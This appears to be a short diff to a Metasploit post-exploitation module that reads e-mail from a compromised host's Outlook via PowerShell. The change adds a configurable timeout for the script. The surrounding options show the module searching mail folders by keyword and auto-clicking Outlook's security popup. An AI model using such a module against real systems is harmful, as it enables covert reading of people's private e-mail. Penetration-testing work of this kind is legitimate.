@@ -40,7 +40,12 @@ class Metasploit3 < Msf::Post
       OptString.new('FOLDER', [ false, 'The e-mailfolder to read (e.g. Inbox)' ]),
       OptString.new('KEYWORD', [ false, 'Search e-mails by the keyword specified here' ]),
       OptString.new('A_TRANSLATION', [ false, 'Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
-      OptString.new('ACF_TRANSLATION', [ false, 'Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ]),
+      OptString.new('ACF_TRANSLATION', [ false, 'Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ])
+    ], self.class)
+
+    register_advanced_options(
+    [
+      OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 120])
     ], self.class)
   end
 
@@ -48,7 +53,7 @@ class Metasploit3 < Msf::Post
     base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "outlook.ps1"))
     psh_script = base_script << command
     compressed_script = compress_script(psh_script)
-    cmd_out, runnings_pids, open_channels = execute_script(compressed_script)
+    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])
     while(d = cmd_out.channel.read)
       print ("#{d}")
     end
